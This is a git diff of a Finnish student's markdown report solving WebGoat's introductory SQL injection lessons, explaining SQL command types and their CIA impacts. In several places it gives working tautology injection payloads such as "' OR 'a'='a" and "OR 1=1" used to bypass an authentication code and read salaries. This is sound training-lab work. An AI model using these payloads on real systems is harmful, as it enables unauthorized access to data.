@@ -119,42 +119,42 @@ Tee ja raportoi:
         AND name NOT LIKE '% %'
     ```
   
-## b) Ratkaise WebGoatista: A1 Injection (intro).
+## b) Ratkaise WebGoatista: A1 Injection (intro).  
   
 2. 
-Haluttu osasto saadaan yksinkertaisella koodilla:
+Haluttu osasto saadaan yksinkertaisella koodilla:  
 `SELECT department FROM employees WHERE last_name LIKE 'Franco' AND first_name LIKE 'Bob'`
 
-Vieläkin helpompi vaihtoehto olisi seuraava, jos tehtävän annossa olisi suoraan annettu käyttäjän userid:
+Vieläkin helpompi vaihtoehto olisi seuraava, jos tehtävän annossa olisi suoraan annettu käyttäjän userid:  
 `SELECT deparment FROM employees WHERE userid=96134`  
 
-3. DML (Data Manipulation Language)
-Sisältää yleisimmät SQL komennot kuten SELECT, INSERT, UPDATE, DELETE jne. 
+3. DML (Data Manipulation Language)  
+Sisältää yleisimmät SQL komennot kuten SELECT, INSERT, UPDATE, DELETE jne.  
 
-CIA rikkomukset:
-Confidentiality, Integrity
+CIA rikkomukset:  
+Confidentiality, Integrity  
 
-Ratkaisu:
+Ratkaisu:  
 ```
 UPDATE employees SET department = 'Sales' WHERE first_name LIKE 'Tobi' AND last_name LIKE 'Barnett'
 USERID FIRST_NAME LAST_NAME DEPARTMENT SALARY AUTH_TAN
 89762 Tobi Barnett Sales 77000 TA9LL1 
 ``` 
-4. DDL (Data Definition Language)
+4. DDL (Data Definition Language)  
 
-Tietokantaobjektien rakenteen luonti (CREATE), muokkaaminen (ALTER) ja pudottaminen (DROP)
+Tietokantaobjektien rakenteen luonti (CREATE), muokkaaminen (ALTER) ja pudottaminen (DROP)  
 
-CIA rikkomukset:
-Integrity and Availability
+CIA rikkomukset:   
+Integrity and Availability  
 
-Ratkaisu:
+Ratkaisu:  
 `ALTER TABLE employees ADD phone varchar(20);`
 
-5. DCL (Data Control Language)
+5. DCL (Data Control Language)  
   
-Oikeuksien lisäämistä/korottamista tietokannan manipuliomiseksi.
+Oikeuksien lisäämistä/korottamista tietokannan manipuliomiseksi.  
   
-Komennot kuten GRANT ja REVOKE.
+Komennot kuten GRANT ja REVOKE.  
   
 CIA rikkomukset:  
 Confidentiality and Availability  
@@ -164,15 +164,15 @@ Solution:
   
 9. Try It! String SQL injection
 
-Monivalintatehtävä:
+Monivalintatehtävä:  
 "SELECT * FROM user_data WHERE first_name = 'John' AND last_name = 'Smith or 1=1';  
   
 10. 
-Aluksi yritin laittaa NaN arvon Login_Count kenttään:
+Aluksi yritin laittaa NaN arvon Login_Count kenttään:  
 `Could not parse: sdfwdf to a number`
 Tämä lienee suojattu.  
 
-Onnistunut kysely:
+Onnistunut kysely:  
 ```
 Login_Count = 0
 userid = 0 OR 1=1 
@@ -180,19 +180,19 @@ userid = 0 OR 1=1
   
 11. Confidentiality (Get access to salaries)
 
-Aluksi katsoin vain, miltä John Smithin tiedot näyttävät:
+Aluksi katsoin vain, miltä John Smithin tiedot näyttävät:  
 Input:  
 ```
 Name: Smith
 TAN: 3SL99A
 ```
-SQL kysely johon injektio pitää tehdä:
+SQL kysely johon injektio pitää tehdä:  
 `"SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "';`
 ```
 Input: Demon' OR 'a'='a
 TAN: 3SL99A' OR 'a'='a
 ```
-Sijoitetaan:
+Sijoitetaan:  
 `"SELECT * FROM employees WHERE last_name = 'Smith' OR 'i'='i' AND auth_tan = '3SL99A' OR 'i'='i';`
 
 Onnistui.  
